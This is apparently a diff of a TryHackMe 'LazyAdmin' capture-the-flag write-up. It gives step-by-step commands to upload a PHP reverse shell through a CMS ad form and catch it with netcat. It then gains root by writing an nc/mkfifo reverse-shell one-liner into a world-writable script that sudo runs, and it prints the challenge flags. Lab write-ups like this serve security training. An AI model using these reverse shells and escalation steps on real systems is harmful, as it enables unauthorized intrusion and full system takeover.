@@ -254,14 +254,14 @@ DOWNLOADED: 13836 - FOUND: 4
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad.png)
 
-14. `firefox "http://{TARGET IP}/content/inc/ads"` to launch Firefox and redirect it to **/content/inc/ads** directory to see if the test ad that we created and uploaded gets saved here, which it did as a PHP (.php) file
+14. `firefox "http://{TARGET IP}/content/inc/ads"` to launch Firefox and redirect it to the **/content/inc/ads** directory to see if the test ad that we created and uploaded gets saved here, which it did as a PHP (.php) file
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad%20Success.png)
 
 # Vulnerability Exploitation
 > PHP Reverse Shell
-15. `git clone https://github.com/pentestmonkey/php-reverse-shell` to download a copy of PentestMonkey's PHP Reverse Shell Github repository onto my local machine
-16. `ls` to verify that the repository was successfully copied onto my local machine, which it has
+15. `git clone https://github.com/pentestmonkey/php-reverse-shell` to download a copy of PentestMonkey's PHP Reverse Shell Github repository onto our attack machine
+16. `ls` to verify that the repository was successfully copied onto our attack machine, which it has
 17. `cd php-reverse-shell` to change into the downloaded Github repository
 18. `ls` to list the contents of the repository
 19. `mousepad php-reverse-shell.php` to laucnh the Mousepad text editor and open the **php-reverse-shell.php** file
@@ -294,18 +294,21 @@ CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.ph
 ┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
 └─$ mousepad php-reverse-shell.php
 ```
-![]()
-16. `nc -lvnp {PORT NUMBER}`
+
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Mousepad%20php%20reverse%20shell.png)
+
+20 `firefox "http://10.10.165.242/content/as/?type=ad"` and copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want, and then upload it
+
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Reverse%20Shell%20Ad%20.png)
+
+21. `nc -lvnp {PORT NUMBER}` to open up a Netcat listener on our attack machine that'll listener for any incoming connections
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9999                            
 listening on [any] 9999 ...
 ```
-17 `firefox "http://10.10.165.242/content/as/?type=ad"` Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Reverse%20Shell%20Ad%20.png)
-
-19. `firefox "http://10.10.165.242/content/inc/ads/"` and click on it
+22. `firefox "http://10.10.165.242/content/inc/ads/"` to launch Firefox and redirect it to the **/content/inc/ads** directory, in which we can now see that our PHP reverse shell payload is now visible and we can execute it just by clicking on it, which created us a reverse shell that connected back to our Netcat listener that's on our attack machine
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/PHP%20Reverse%20Shell%20Uploaded.png)
 ```bash
@@ -320,10 +323,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-21. `ls`
-22. `ls /home`
-23. `ls /home/{USER}`
-24. `cat /home/{USER}/{USER FLAG}.txt`
+23. `ls /` to display the available files and directories that are on the target's filesystem root directoy  
+24. `ls /home` to display the available files and directories that are on the target's **/home** directory, which reveals a single user
+25. `ls /home/{USER}` to display the available files and directories that are on the discovered user's home directory, which reveals there to be a user text file
+26. `cat /home/{USER}/{USER FLAG}.txt` to display the contents of the user text file we found onto our terminal, which ended up caintaining the user's flag for this challenge
 ```bash
 $ ls
 bin
@@ -378,7 +381,7 @@ THM{63e5bce9271952aad1113b6f1ac28a07}
 
 # Post Exploitation
 > Privilege Escalation
-25. `sudo -l`
+27. `sudo -l` to list the sudo privileges assigned to the user that we're currently logged in as onto our terminal, which reveals that 
 ```bash
 $ sudo -l
 Matching Defaults entries for www-data on THM-Chal:
@@ -387,15 +390,15 @@ Matching Defaults entries for www-data on THM-Chal:
 User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
-26. `cat /home/{USER}/{FILENAME3}.pl`
+28. `cat /home/{USER}/{FILENAME3}.pl`
 ```bash
 $ cat /home/itguy/backup.pl
 #!/usr/bin/perl
 
 system("sh", "/etc/copy.sh");
 ```
-27. `cat /etc/{FILENAME4}.sh`
-28. `ls -ali /etc/{FILENAME4}.sh`
+29. `cat /etc/{FILENAME4}.sh`
+30. `ls -ali /etc/{FILENAME4}.sh`
 ```bash
 $ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
@@ -404,9 +407,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 $ ls -ali /etc/copy.sh
 1050508 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
 ```
-29. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
-30. `nc -lvnp {PORT NUMBER}`
-31. `sudo /usr/bin/perl /home/itguy/backup.pl`
+31. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
+32. `nc -lvnp {PORT NUMBER}`
+33. `sudo /usr/bin/perl /home/itguy/backup.pl`
 ```bash
 $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.54.63 9998 >/tmp/f" > /etc/copy.sh
 ```
@@ -426,9 +429,9 @@ connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 38970
 /bin/sh: 0: can't access tty; job control turned off
 # 
 ```
-32. `whoami`
-33. `ls /root`
-34. `cat /root/{ROOT FLAG}.txt`
+34. `whoami`
+35. `ls /root`
+36. `cat /root/{ROOT FLAG}.txt`
 ```bash
 # whoami
 root
